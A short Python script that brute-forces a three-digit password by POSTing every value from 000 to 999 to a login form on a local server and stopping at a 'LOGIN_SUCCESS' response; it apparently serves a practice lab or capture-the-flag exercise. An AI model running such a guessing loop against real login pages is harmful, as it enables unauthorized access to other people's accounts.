import requests

URL = "http://127.0.0.1:5000/"

for number in range(1000):

    password = f"{number:03d}"

    response = requests.post(
        URL,
        data={"password": password}
    )

    print("Trying:", password)

    if "LOGIN_SUCCESS" in response.text:
        print("\nPassword found!")
        print("Password:", password)
        break

else:
    print("Password not found.")
